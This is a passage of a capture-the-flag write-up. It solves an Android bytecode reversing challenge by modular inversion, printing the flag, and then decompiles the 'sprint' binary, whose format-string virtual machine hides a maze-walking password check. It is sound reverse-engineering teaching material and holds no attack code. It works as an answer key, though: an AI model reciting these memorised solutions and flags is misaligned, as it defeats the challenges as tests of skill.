If it is `48`, we move on to `L8`, otherwise `❌` is displayed and execution stops.\n\nAt [`L8`](files/android-bytecode-2.txt#L291) and [`L9`](files/android-bytecode-2.txt#L293-L340), we finally do some actual computations:\n\n```\n  :L8\n    const/4 v5, 0\n  :L9\n    invoke-virtual { v3 }, Ljava/lang/String;->length()I\n    move-result v6\n    div-int/2addr v6, v7\n    if-ge v5, v6, :L10\n    iget-object v6, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget-object v6, v6, Lcom/google/ctf/sandbox/\\u0151;->ő:[J\n    mul-int/lit8 v8, v5, 4\n    add-int/2addr v8, v4\n    invoke-virtual { v3, v8 }, Ljava/lang/String;->charAt(I)C\n    move-result v8\n    shl-int/lit8 v8, v8, 24\n    int-to-long v8, v8\n    aput-wide v8, v6, v5\n    iget-object v6, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget-object v6, v6, Lcom/google/ctf/sandbox/\\u0151;->ő:[J\n    aget-wide v8, v6, v5\n    mul-int/lit8 v10, v5, 4\n    const/4 v11, 2\n    add-int/2addr v10, v11\n    invoke-virtual { v3, v10 }, Ljava/lang/String;->charAt(I)C\n    move-result v10\n    shl-int/lit8 v10, v10, 16\n    int-to-long v12, v10\n    or-long/2addr v8, v12\n    aput-wide v8, v6, v5\n    iget-object v6, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget-object v6, v6, Lcom/google/ctf/sandbox/\\u0151;->ő:[J\n    aget-wide v8, v6, v5\n    mul-int/lit8 v10, v5, 4\n    const/4 v12, 1\n    add-int/2addr v10, v12\n    invoke-virtual { v3, v10 }, Ljava/lang/String;->charAt(I)C\n    move-result v10\n    shl-int/lit8 v10, v10, 8\n    int-to-long v12, v10\n    or-long/2addr v8, v12\n    aput-wide v8, v6, v5\n    iget-object v6, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget-object v6, v6, Lcom/google/ctf/sandbox/\\u0151;->ő:[J\n    aget-wide v8, v6, v5\n    mul-int/lit8 v10, v5, 4\n    invoke-virtual { v3, v10 }, Ljava/lang/String;->charAt(I)C\n    move-result v10\n    int-to-long v12, v10\n    or-long/2addr v8, v12\n    aput-wide v8, v6, v5\n    add-int/lit8 v5, v5, 1\n    goto :L9\n```\n\nThis is a loop that can be encoded in Python as:\n\n```python\nflag_pieces = [0] * 12\n\n# v3 is the flag, as a string\nI32 = 0xFFFFFFFF\nI64 = 0xFFFFFFFFFFFFFFFF\n\n# L8\nv5 = 0\n\n# L9\nwhile True:\n  v6 = len(v3)\n  v6 //= v7\n  if v5 >= v6:\n    break\n  v8 = (ord(v3[v5 * 4 + 3]) << 24) & I32\n  flag_pieces[v5] = v8\n\n  v10 = (ord(v3[v5 * 4 + 2]) << 16) & I32\n  v8 = (v8 | v10) & I64\n  flag_pieces[v5] = v8\n\n  v10 = (ord(v3[v5 * 4 + 1]) << 8) & I32\n  v8 = (v8 | v10) & I64\n  flag_pieces[v5] = v8\n\n  v10 = ord(v3[v5 * 4])\n  v8 = (v8 | v10) & I64\n  flag_pieces[v5] = v8\n\n  v5 += 1\n```\n\nThe result is actually just that 4 bytes of the flag at a time get packed into a single number. We end up with 12 `long`s representing our input.\n\n```\n  :L10\n    const-wide v4, 4294967296L\n    iget-object v6, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget-object v7, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget-object v7, v7, Lcom/google/ctf/sandbox/\\u0151;->ő:[J\n    iget-object v8, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget v8, v8, Lcom/google/ctf/sandbox/\\u0151;->ő:I\n    aget-wide v8, v7, v8\n    invoke-static { v8, v9, v4, v5 }, Lcom/google/ctf/sandbox/R;->\\u0151(JJ)[J\n    move-result-object v6\n    const/4 v7, 0\n    aget-wide v7, v6, v7\n    rem-long/2addr v7, v4\n    add-long/2addr v7, v4\n    rem-long/2addr v7, v4\n    iget-object v9, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget-object v9, v9, Lcom/google/ctf/sandbox/\\u0151;->class:[J\n    iget-object v10, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget v10, v10, Lcom/google/ctf/sandbox/\\u0151;->ő:I\n    aget-wide v10, v9, v10\n    cmp-long v9, v7, v10\n    if-eqz v9, :L11\n    iget-object v9, v1, Lcom/google/ctf/sandbox/\\u0151$1;->val$textView:Landroid/widget/TextView;\n    const-string v10, \"\\u274c\"\n    invoke-virtual { v9, v10 }, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V\n    return-void\n```\n\nAt [`L10`](files/android-bytecode-2.txt#L342-L366), we take one of the numbers from the array initialised during [static initialisation](#static-initialiser). It is then compared to the result of `ő(flag_piece, 4294967296L) % 0x100000000` (JADX decompiled `ő` as `m0`, also listed all the way at the beginning). Keep the modulo operation in mind! In Python:\n\n```python\nv8 = flag_pieces[field_int]\nv6 = m0(v8, 0x100000000)\nv7 = v6[0]\n# v7 = (v7 % 0x100000000) & I64\n# v7 = (v7 + 0x100000000) & I64\n# v7 = (v7 % 0x100000000) & I64\n# the above three seem to just do:\nv7 = v7 & I32\nif v7 != init_arr[field_int]:\n  print(\"fail\")\n```\n\nThis checks just 4 bytes of the flag, but:\n\n```\n  :L11\n    iget-object v9, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget v10, v9, Lcom/google/ctf/sandbox/\\u0151;->ő:I\n    const/4 v11, 1\n    add-int/2addr v10, v11\n    iput v10, v9, Lcom/google/ctf/sandbox/\\u0151;->ő:I\n    iget-object v9, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget v9, v9, Lcom/google/ctf/sandbox/\\u0151;->ő:I\n    iget-object v10, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget-object v10, v10, Lcom/google/ctf/sandbox/\\u0151;->ő:[J\n    array-length v10, v10\n    if-lt v9, v10, :L12\n    iget-object v9, v1, Lcom/google/ctf/sandbox/\\u0151$1;->val$textView:Landroid/widget/TextView;\n    const-string v10, \"\\ud83d\\udea9\"\n    invoke-virtual { v9, v10 }, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V\n    return-void\n  :L12\n    new-instance v8, Ljava/lang/RuntimeException;\n    invoke-direct { v8 }, Ljava/lang/RuntimeException;-><init>()V\n    throw v8\n```\n\nWe conditionally jump to [`L12`](files/android-bytecode-2.txt#L384-L386) from [`L11`](files/android-bytecode-2.txt#L368-L382) based on the value of an integer field, also called `ő`. Each time `L11` is entered, the field is incremented, and if it is smaller than the number of 4-byte flag pieces, `L12` is entered, where an exception is thrown, which puts us back into `L0`. This way, we get a loop implemented with exception handlers.\n\n### Finding the flag\n\nUnderstanding the click handler, we can conclude that we are looking for a flag that satisfies the following constraints:\n\n```python\nm0(flag_piece[ 0], 0x100000000) % 0x100000000 == 0x0271986B\nm0(flag_piece[ 1], 0x100000000) % 0x100000000 == 0xA64239C9\nm0(flag_piece[ 2], 0x100000000) % 0x100000000 == 0x271DED4B\nm0(flag_piece[ 3], 0x100000000) % 0x100000000 == 0x01186143\nm0(flag_piece[ 4], 0x100000000) % 0x100000000 == 0xC0FA229F\nm0(flag_piece[ 5], 0x100000000) % 0x100000000 == 0x690E10BF\nm0(flag_piece[ 6], 0x100000000) % 0x100000000 == 0x28DCA257\nm0(flag_piece[ 7], 0x100000000) % 0x100000000 == 0x16C699D1\nm0(flag_piece[ 8], 0x100000000) % 0x100000000 == 0x55A56FFD\nm0(flag_piece[ 9], 0x100000000) % 0x100000000 == 0x7EB870A1\nm0(flag_piece[10], 0x100000000) % 0x100000000 == 0xC5C9799F\nm0(flag_piece[11], 0x100000000) % 0x100000000 == 0x2F838E65\n```\n\nDuring the CTF, this part was brute forced, since checking all `2 ** 32` possible inputs on many cores took a relatively short amount of time.\n\nUpon closer inspection of `m0`, we can find it is actually computing [Bézout's coefficients](https://en.wikipedia.org/wiki/B%C3%A9zout%27s_identity), i.e. for inputs `a` and `b`, it is finding `x` and `y` such that:\n\n```\na * x + b * y == gcd(a, b)\n```\n\n(Where `gcd` is the [greatest common divisor](https://en.wikipedia.org/wiki/Greatest_common_divisor).)\n\nAlthough the method returns both of the coefficients, we only know the first one. So in our case:\n\n```\nflag_piece[ 0] * 0x0271986B + 0x100000000 * ? == gcd(flag_piece[ 0], 0x100000000) mod 2 ** 32\nflag_piece[ 1] * 0xA64239C9 + 0x100000000 * ? == gcd(flag_piece[ 1], 0x100000000) mod 2 ** 32\nflag_piece[ 2] * 0x271DED4B + 0x100000000 * ? == gcd(flag_piece[ 2], 0x100000000) mod 2 ** 32\nflag_piece[ 3] * 0x01186143 + 0x100000000 * ? == gcd(flag_piece[ 3], 0x100000000) mod 2 ** 32\nflag_piece[ 4] * 0xC0FA229F + 0x100000000 * ? == gcd(flag_piece[ 4], 0x100000000) mod 2 ** 32\nflag_piece[ 5] * 0x690E10BF + 0x100000000 * ? == gcd(flag_piece[ 5], 0x100000000) mod 2 ** 32\nflag_piece[ 6] * 0x28DCA257 + 0x100000000 * ? == gcd(flag_piece[ 6], 0x100000000) mod 2 ** 32\nflag_piece[ 7] * 0x16C699D1 + 0x100000000 * ? == gcd(flag_piece[ 7], 0x100000000) mod 2 ** 32\nflag_piece[ 8] * 0x55A56FFD + 0x100000000 * ? == gcd(flag_piece[ 8], 0x100000000) mod 2 ** 32\nflag_piece[ 9] * 0x7EB870A1 + 0x100000000 * ? == gcd(flag_piece[ 9], 0x100000000) mod 2 ** 32\nflag_piece[10] * 0xC5C9799F + 0x100000000 * ? == gcd(flag_piece[10], 0x100000000) mod 2 ** 32\nflag_piece[11] * 0x2F838E65 + 0x100000000 * ? == gcd(flag_piece[11], 0x100000000) mod 2 ** 32\n```\n\nWe don't know the flag pieces or the second Bézout coefficient, but we do know something about the GCD. No matter what the flag piece is, the greatest common divisor must be a power of two, since `0x100000000 == 2 ** 32 == 2 * 2 * ... * 2`. As an additional constraint we know that each flag piece must be composed of ASCII bytes.\n\nWe are also operating in `mod 2 ** 32`, which means that the `+ 0x100000000 * ?` part will never have an effect on the result. Therefore, we can simplify:\n\n```\n(flag_piece[ 0] * 0x0271986B) % 0x100000000 in [1, 2, 4, ... ]\n(flag_piece[ 1] * 0xA64239C9) % 0x100000000 in [1, 2, 4, ... ]\n(flag_piece[ 2] * 0x271DED4B) % 0x100000000 in [1, 2, 4, ... ]\n(flag_piece[ 3] * 0x01186143) % 0x100000000 in [1, 2, 4, ... ]\n(flag_piece[ 4] * 0xC0FA229F) % 0x100000000 in [1, 2, 4, ... ]\n(flag_piece[ 5] * 0x690E10BF) % 0x100000000 in [1, 2, 4, ... ]\n(flag_piece[ 6] * 0x28DCA257) % 0x100000000 in [1, 2, 4, ... ]\n(flag_piece[ 7] * 0x16C699D1) % 0x100000000 in [1, 2, 4, ... ]\n(flag_piece[ 8] * 0x55A56FFD) % 0x100000000 in [1, 2, 4, ... ]\n(flag_piece[ 9] * 0x7EB870A1) % 0x100000000 in [1, 2, 4, ... ]\n(flag_piece[10] * 0xC5C9799F) % 0x100000000 in [1, 2, 4, ... ]\n(flag_piece[11] * 0x2F838E65) % 0x100000000 in [1, 2, 4, ... ]\n```\n\nWhere each result is *most likely* `1`. The operation was simplified down to a modular multiplication. If the result is `1`, the inverse operation is the modular inverse. So our solution is simply:\n\n```python\nimport gmpy2\n\ncoeffs = [\n  0x0271986B,\n  0xA64239C9,\n  0x271DED4B,\n  0x01186143,\n  0xC0FA229F,\n  0x690E10BF,\n  0x28DCA257,\n  0x16C699D1,\n  0x55A56FFD,\n  0x7EB870A1,\n  0xC5C9799F,\n  0x2F838E65\n]\n\nflag_pieces = []\nfor c in coeffs:\n  flag_piece = int(gmpy2.invert(c, 0x100000000))\n  flag_pieces.append(flag_piece.to_bytes(4, \"little\").decode(\"utf-8\"))\n\nprint(\"\".join(flag_pieces))\n```\n\nAnd indeed:\n\n```bash\n$ python3 android-solve.py\nCTF{y0u_c4n_k3ep_y0u?_m4gic_1_h4Ue_laser_b3ams!}\n```\n\n## 173 reversing / sprint ##\n\n**Description**\n\n> Sprint faster than this binary!\n\n**Files provided**\n\n - [sprint](https://storage.googleapis.com/gctf-2020-attachments-project/c39e555802aa479765c70804396ea5a55ca69583a8de716cc9f03f238a916cb01850b146a0313e9f684c5b86a164498324e42bd17502dea14ad91f1247c660ad)\n\n**Solution** (by [Aurel300](https://github.com/Aurel300))\n\nWe are given a 64-bit ELF binary. Upon decompilation, we can see a single function of interest – `main` itself.\n\n### `main`\n\nWith some manual clean-up, we can write its source code as (the meaning of the variable names will be clear soon):\n\n```c\nchar *SPRINT_ROM;\n\nint main(int argc, const char **argv, const char **envp) {\n  char *memory = (char *)mmap((void *)0x4000000, 0x4000000uLL, 0x3, 0x22, -1, 0LL);\n  memcpy(memory, SPRINT_ROM, 0xF134uLL);\n  uint16_t *regA = (uint16_t *)memory;\n  int64_t regB = 0LL;\n  int64_t regC = 0LL;\n  int64_t regD = 0LL;\n  int64_t regE = 0LL;\n  int64_t regF = 0LL;\n  int64_t regG = 0LL;\n  int64_t regH = 0LL;\n  int64_t regI = 0LL;\n  char *regIP = memory;\n  puts(\"Input password:\");\n  scanf(\"%255s\", &memory[0xE000]);\n  while (regIP != &memory[0xFFFE]) {\n    sprintf(\n      &memory[0x2000000],\n      regIP, \"\", 0LL, &regIP, &memory[0x2000000],\n      *regA, regA, &regA, regB, &regB, regC, &regC, regD, &regD, regE, &regE,\n      regF, &regF, regG, &regG, regH, &regH, regI, &regI);\n  }\n  if (*((int16_t *)(&memory[0xE800]))) {\n    printf(\"Flag: %s\\n\", &memory[0xE800]);\n  }\n  return 0;\n}\n```\n\n#### Memory initialisation\n\nLet's look at this bit by bit.\n\n```c\nchar *memory = (char *)mmap(\n  (void *)0x4000000,            // (preferred) address\n  0x4000000uLL,                 // size in bytes\n  PROT_EXEC | PROT_WRITE,       // protection\n  MAP_ANONYMOUS | MAP_PRIVATE,  // flags\n  -1,                           // file descriptor\n  0LL);                         // offset\n```\n\nWe start with [`mmap`](https://linux.die.net/man/3/mmap) to allocate a largish (64 MiB) area of contiguous memory.\n\nDue to `MAP_ANONYMOUS`, the allocated memory is just fresh, empty memory, rather than a file. This also explains the dummy `-1` value passed as the file descriptor and the `0` offset, since both of these values only make sense when mapping a file into memory.\n\nThe fact that the mapped memory is executable (`PROT_EXEC`) is strange, although it turns out not to be relevant for this challenge.\n\nThe memory should be allocated exactly at the address `0x4000000`. Whether this actually happens depends on the specific implementation of `mmap` and might require the `MAP_FIXED` flag. For this challenge we assume it works this way (as it did on our VMs). The large size of the allocated region might also play a role in this, since only a small portion of the memory is used in the end.\n\n```c\nmemcpy(\n  memory,      // destination\n  SPRINT_ROM,  // source\n  0xF134uLL);  // size in bytes\n```\n\nThe first `0xF134` (`61748`) bytes of the memory region are initialised with the constant `SPRINT_ROM`, which is part of the executable. In IDA Pro this incorrectly decompiles to a copy of the string literal `\"%1$00038s%3$hn%1$65498s%1$28672s%9$hn\"`, but this is only the first part of the data. The full constant actually contains 146 format strings (all null-terminated), followed by some amount of 0-byte padding, and finally `0x134` (`308`) bytes of additional data.\n\nWe'll see the exact contents of `SPRINT_ROM` later.\n\n#### Registers\n\n```c\nuint16_t *regA = (uint16_t *)memory;\nint64_t regB = 0LL;\nint64_t regC = 0LL;\nint64_t regD = 0LL;\nint64_t regE = 0LL;\nint64_t regF = 0LL;\nint64_t regG = 0LL;\nint64_t regH = 0LL;\nint64_t regI = 0LL;\nchar *regIP = memory;\n```\n\nA number of \"register\" variables is initialised. Nothing terribly exciting here, but these variables will be used in the `sprintf` machinery that will soon follow.\n\n#### User prompt\n\n```c\nputs(\"Input password:\");\nscanf(\n  \"%255s\",           // format string\n  &memory[0xE000]);  // destination\n```\n\nThe user is prompted for a \"password\", consisting of up to 255 characters. These are loaded at the offset `0xE000` in the allocated memory.\n\n#### Flag output\n\n```c\nif (*((int16_t *)(&memory[0xE800]))) {\n  printf(\"Flag: %s\\n\", &memory[0xE800]);\n}\n```\n\nThe memory location at offset `0xE800` is checked at the end of the program execution. If the word (2 bytes) at that location is not zero, they should form the beginning of the flag as a null-terminated string.\n\n#### Main loop\n\nFinally, let's tackle the elephant in the room.\n\n```c\nwhile (regIP != &memory[0xFFFE]) {\n  sprintf(\n    &memory[0x2000000],  // destination\n    regIP,               // format string\n    \"\",                  // 1$\n    0LL,                 // 2$\n    &regIP,              // 3$\n    &memory[0x2000000],  // 4$\n    *regA, regA, &regA,  // 5$, 6$, 7$\n    regB, &regB,         // 8$, 9$\n    regC, &regC,         // 10$, 11$\n    regD, &regD,         // 12$, 13$\n    regE, &regE,         // 14$, 15$\n    regF, &regF,         // 16$, 17$\n    regG, &regG,         // 18$, 19$\n    regH, &regH,         // 20$, 21$\n    regI, &regI);        // 22$, 23$\n}\n```\n\n[`sprintf`](https://linux.die.net/man/3/sprintf) is just like `printf`, but rather than outputting the formatted string to the standard output, it is instead pasted into the destination passed as the first argument.\n\nThe format string itself is at the address `regIP`. From the `while` loop condition we can easily deduce that `regIP` should be changing as execution proceeds, and that the offset `0xFFFE` in the allocated memory is a stopping point.\n\nAll the additional arguments to the format string (23 of them!) refer to one of the many \"register\" variables defined earlier, in addition to some utility constants. Each register is passed in directly, but also as a pointer, allowing the format string to change the values in these registers. The `1$` – `23$` numbering comes from the [\"parameter field\"](https://en.wikipedia.org/wiki/Printf_format_string#Parameter_field), which allows format strings to refer to their arguments with more flexibility.\n\nBut the code we saw so far still doesn't answer the key question: what does all of this actually *do*?\n\n### The format strings\n\n#### Atoms\n\nLet's take a closer look at the 146 format strings from `SPRINT_ROM`. They are all composed of smaller parts, i.e. individual format specifiers.\n\nThe first one to note is the use of the `%n` specifier, which allows the `sprintf` call to write data back to its arguments, rather than just to its destination string. More specifically, `%n` writes the number of characters output *so far* into the indicated argument. As an example:\n\n```c\nint x = 0;\nsprintf(some_string, \"abcdabcdabcd%n\", &x);\n```\n\nThis would result in the value `12` being stored in `x`. `%n` can also be combined with the `h` length field to refer to a 16-bit integer rather than a 32-bit one. So, if `sprintf` has output `100000` characters so far, a `%hn` will result in the value `34464` (`100000 % 65536`) being written to the argument.\n\n`%n` is often used for [format string exploits](https://en.wikipedia.org/wiki/Uncontrolled_format_string), but here we don't control the format strings.\n\nEvery single format string in `SPRINT_ROM` uses `%n` at least once, in the form `%3$hn`, i.e. \"write the number of bytes output so far into the third argument as a 16-bit integer\". The third argument passed to `sprintf` is `&regIP`.\n\nWith all of this in mind, let's try to categorise all of the format strings into a smaller number of \"instructions\".\n\n#### `%1$NNNNNs%3$hn`\n\nConcrete example: `%1$00430s%3$hn`\n\nThe shortest strings are of the form `%1$NNNNNs%3$hn`. These first write exactly `NNNNN` bytes to the output, then write that same number back into `regIP`. We can express the effect of this instruction as:\n\n```c\nbytesWritten += NNNNN;\nregIP = bytesWritten;\n```\n\nThe first argument `1$` always refers to the empty string, ensuring that this instruction works even if `NNNNN` happened to be zero.\n\n#### `%1$NNNNNs%3$hn%1$MMMMMs...`\n\nConcrete example: `%1$00789s%3$hn%1$64747s`\n\nThe prefix `%1$NNNNNs%3$hn%1$MMMMMs...` can be found in most of the other format strings. Importantly, the two numbers sum to `65536`, which is just `0` again when downcast to a 16-bit integer. So the effect of this prefix is:\n\n```c\nbytesWritten += NNNNN;\nregIP = bytesWritten;\nbytesWritten -= NNNNN; // bytesWritten = 0\n```\n\nThis means that `regIP` will be set to the new address, and the number of bytes output by `sprintf` is \"reset\" back to zero. In an even simpler form:\n\n```c\nregIP = NNNNN;\n```\n\nIn the remaining instructions we'll shorten this common prefix to `<PRE>` and ignore its effects where possible.\n\n#### `<PRE>%1$NNNNNs%X$hn`\n\nConcrete example: `%1$28672s%9$hn`\n\nJust like the writes to `3$`, format strings can write 16-bit values to other registers using the same method. If `X` is `7`, the value is written to `regA`, if `X` is `9`, it is written to `regB`, and so forth.\n\n```c\nregX = NNNNN;\n```\n\nAs noted in the [main loop section](#main-loop), each register is passed twice, once as its value, and once as a pointer. If `X` is `6`, the value is instead written to `*regA`, i.e. the location pointed to by `regA`. Likewise `8` is `*regB`, etc.\n\n```c\n*regX = NNNNN;\n```\n\n#### `<PRE>%1$*X$s%Y$hn`\n\nConcrete example: `%1$*8$s%7$hn`\n\nAn asterisk (`*`) can be used as the width specifier, in which case the width of the printed field depends on an argument to `sprintf`. And just like the other arguments, a number can be used to specify *which* argument will be used here. So the effect oft he first part is to output exactly `X` bytes. Then this value is written as a 16-bit integer into `Y` as usual.\n\n```c\nbytesWritten += regX;\nregY = bytesWritten;\n```\n\n#### `<PRE>%1$*X$s%1$NNNNNs%Y$hn`\n\nConcrete example: `%1$*8$s%1$2s%7$hn`\n\nThis is almost the same as the last instruction, with an extra `%1$NNNNNs`. The effect of this part is to output some constant amount of extra bytes.\n\n```c\nbytesWritten += regX;\nbytesWritten += NNNNN;\nregY = bytesWritten;\n```\n\nMore combinations of summations occur in the instructions, some using constants, some using the registers, some writing to where a register points, some writing to the register itself. We will not enumerate all of these options, since they consist of blocks we have already seen.\n\n#### `%X$c%1$NNNNNs%2$c%4$s%1$MMMMMs%3$hn`\n\nConcrete example: `%14$c%1$00419s%2$c%4$s%1$65499s%3$hn`\n\nThis one is quite interesting. Note that this instruction does not have the common prefix. It does the following:\n\n - `%X$c` output `regX` as a single character\n - `%1$NNNNNs` output `NNNNN` bytes\n - `%2$c` output a zero byte (`2$` is `0LL` in the `sprintf` call)\n - `%4$s` output the string at `4$` (!)\n - `%1$MMMMMs` output `MMMMM` bytes\n - `%3$hn` write the number of bytes output so far into `regIP` as a 16-bit integer\n\nThe fourth step is very important here. `4$` in the `sprintf` call is `&memory[0x2000000]`. But `&memory[0x2000000]` is also the destination for the `sprintf` calls, so the first three parts of this instruction actually create a string that is then read by `sprintf` and output once again!\n\nThe final piece of the puzzle is then the fact that strings are null-terminated in C, so all of the above will allow some conditional logic in the code. Consider what happens when register `X` (or rather its least significant byte) is zero, and what happens when it is not:\n\n| Step | `regX & 0xFF == 0` | `regX & 0xFF != 0` |\n| --- | --- | --- |\n| `%X$c` | Output a null byte | Output any other byte |\n| `%1$NNNNNs` | Output `NNNNN` bytes | Output `NNNNN` bytes |\n| `%2$c` | Output a null byte | Output a null byte |\n| `%4$s` | Output an empty string | Output a string of `NNNNN + 1` bytes |\n| `%1$MMMMMs` | Output `MMMMM` bytes | Output `MMMMM` bytes |\n| `%3$hn` | Write `1 + NNNNN + 1 + 0 + MMMMM` to `regIP` | Write `1 + NNNNN + 1 + NNNNN + 1 + MMMMM` to `regIP` |\n\nIn the format strings, `NNNNN` and `MMMMM` are set just right, so that this instruction encodes a conditional branch, setting `regIP` to different values depending on whether `regX` was zero or not.\n\n```c\nif (regX & 0xFF) {\n  regIP = (2 + NNNNN + MMMMM) & 0xFFFF;\n} else {\n  regIP = (3 + NNNNN + NNNNN + MMMMM) & 0xFFFF;\n}\n```\n\n#### Pseudo-assembly\n\nPutting it all together, we can finally understand the format strings as a series of instructions with some conditional logic. `regIP` initially points to the first format string, but it is modified as the program executes. Most instructions contain a common prefix which sets `regIP` to the next instruction before performing a step with the other registers. The conditional branches always encode a jump to either the next instruction, or a completely different instruction. There is no restriction on the jump destinations, so backward jumps are possible. An unconditional jump to `0xFFFE` stops execution, due to the condition of the main `while` loop.\n\n```\n0x0000: regB  = 0x7000\n0x0026: regA  = regB\n0x004A: *regA = 0x1\n0x006C: regA  = 0x2 + regB\n0x0095: *regA = 0x1\n0x00B7: regC  = 0x2\n...\n```\n\n([Full pseudo-assembly here](files/sprint-assembly.txt))\n\nInterestingly a lot of the arguments to `sprintf` were not used at all. We can only surmise that this is because the generator for this challenge was made somewhat generic, and the regular layout of the register arguments is neater. `regI` is only ever written to, and seems to indicate a sort of exit code, even though it is not checked, not by the `sprintf` program, nor by the host program.\n\n### Pseudocode\n\nWith our assembly in hand, we can perform analyses to get to something more readable, easier to understand.\n\nWe first split the code into blocks. Any address mentioned in a `goto` (including conditional ones) is a jump destination and begins a new block. Equivalently, `goto`s and conditionals (and `halt`s) terminate a block.\n\n([Analysis source code: block splitting](scripts/SprintAnalyse.hx#L49-L106))\n\nThen we can look at which registers are read and written by each block. A block can both read and write the same register.\n\n([Analysis source code: register reads/writes](scripts/SprintAnalyse.hx#L108-L112))\n\nWith this information, we can infer variables, to reverse the process of [register allocation](https://en.wikipedia.org/wiki/Register_allocation). In short, when the current block writes into a register, this register is propagated through to all the blocks that can follow the current one. As long as the blocks read the given register, we can fuse them into the same variable. Once we find a block that overwrites our chosen register, we stop the recursion.\n\n([Analysis source code: variable reconstruction](scripts/SprintAnalyse.hx#L126-L149))\n\nAt this point, we will have less difficulty re-organising code blocks, because we don't have to be afraid that we are missing what particular registers mean at any given point. Additionally, we can (manually) do some constant folding, further eliminating variables that are only written to once.\n\n```\n0x0000: (from -)\n  [0x7000] = 0x0001\n  [0x7002] = 0x0001\n  var2 = 0x0002\n\n0x00DA: (from 0x0324, 0x0000)\n  if ([0x7000 + var2 * 2]) goto 0x0324 else goto 0x0180\n\n0x0180: (from 0x00DA)\n  var6 = var2 * 2\n\n0x01AE: (from 0x0269, 0x0180)\n  [0xFFEF] = var6\n  if ([0xFFF0]) goto 0x0324 else goto 0x0269\n...\n```\n\n([Full pseudo-assembly with blocks and variables here](files/sprint-renum.txt))\n\nNow we can take a better look at the way control flows through the program and recover proper loops and conditional blocks. The goal is to eliminate all `goto` instructions. This analysis can be also be done automatically (by looking at the \"shapes\" in the node graph), but the code was short enough where it was faster to do it by hand.\n\n```\n[0x7000] = 0x0001;\n[0x7002] = 0x0001;\nvar2 = 0x0002;\n\ndo {\n  if ([0x7000 + var2 * 2] == 0) {\n    var6 = var2 * 2;\n    while (true) {\n      [0xFFEF] = var6;\n...\n```\n\n([Full pseudo-code after CF analysis here](files/sprint-reflow.txt))\n\nAnd finally, we can name the variables more sensibly. This would be much more difficult if we were working directly with the assembly. We will analyse the resulting code one piece at a time.\n\nThe code is almost working C. The memory access operations would have to index into some pre-defined memory buffer. Almost all operations are 16-bit (i.e. word-based), except for conditions, which only check the least significant 8 bits. One idiom that is used multiple times is based on unaligned memory access:\n\n```\n[0xFFEF] = sub_position;\nif ([0xFFF0]) break; // or another operation on [0xFFF0]\n```\n\nThe variable is written into location `0xFFEF`, but because of the 16-bit operations, both `0xFFEF` and `0xFFF0` are modified. The second byte is then checked. In the example above, `break` is executed if `sub_position` is greater or equal to `256`.\n\n#### Initialisation\n\n```\n// initialise the map walls\n[0x7000] = 0x0001;\n[0x7002] = 0x0001;\n\nlet map_position = 0x0002;\ndo {\n  if ([0x7000 + map_position * 2] == 0) {\n    let sub_position = map_position * 2;\n    while (true) {\n      [0xFFEF] = sub_position;\n      if ([0xFFF0]) break;\n      [0x7000 + sub_position * 2] = 0x0001;\n      sub_position += map_position;\n    }\n  }\n  map_position += 0x0001;\n} while (map_position);\n```\n\nWe start off by initialising the memory at `0x7000`. The words at `0x7000` and `0x7002` are set to `1`, then in our loop we repeat a memory fill operation 254 times.\n\nThis strange loop produces the following pattern at memory location `0x7000`:\n\n```\nX X     X   X   X X X   X   X X \nX   X   X X X   X X X X X   X   \nX X X X X   X X X   X   X X X   \nX X X X X   X X X X X   X   X X \nX X X   X X X   X   X X X X X   \nX X X   X X X X X   X X X X X X \nX   X X X   X   X X X   X   X X \nX   X X X X X X X X X X X X X   \nX X X   X X X X X   X   X X X X \nX X X X X   X   X X X X X   X X \nX X X   X X X   X X X X X   X X \nX X X   X   X X X X X X X X X   \nX   X X X   X   X X X X X X X X \nX X X   X X X X X X X X X X X   \nX X X   X   X X X   X X X X X   \nX   X X X X X X X X X   X X X X \n```\n\nWhere `X` represents a `1` byte, and spaces represent `0` bytes.\n\n#### User input\n\n```\n// calculate the length of user input\nlet user_input_ptr = 0xE000;\nlet user_input_negative_length = 0;\nwhile ([user_input_ptr]) {\n  user_input_negative_length -= 1;\n  user_input_ptr += 1;\n}\n\n// if the user input is not 254 characters long, halt\nif (-254 != user_input_negative_length) {\n  error_num = 5;\n  [0xE800] = 0;\n  halt;\n}\n```\n\nThe next step is to check the length of the user input, which was loaded into memory at offset `0xE000` before the main loop. Nothing particularly interesting here, except that maybe the user input can be any length that is `254 + n * 256` for some `n`. We will assume it should be `254` though.\n\n#### Maze navigation\n\n```\n// check user password, navigate the maze\nlet pw_position = 0;\nlet checkpoint_counter = 0;\nlet map_position = [0xF100];\nlet pw_valid = 1;\nerror_num = 0;\n\nwhile (true) {\n  // take the next byte of the password\n  let pw_byte = [0xE000 + pw_position];\n  if (!pw_byte) break;\n  pw_position += 1;\n\n  // up / right / down / left\n  let map_delta;\n  if (pw_byte == 'u') {\n    map_delta = -16;\n  } else if (pw_byte == 'r') {\n    map_delta = 1;\n  } else if (pw_byte == 'd') {\n    map_delta = 16;\n  } else if (pw_byte == 'l') {\n    map_delta = -1;\n  } else {\n    pw_valid = 0x0000;\n    map_delta = 0;\n    error_num = 1;\n  }\n  map_position += map_delta;\n\n  // if we went out of bounds, halt\n  [0xFFEF] = map_position;\n  if 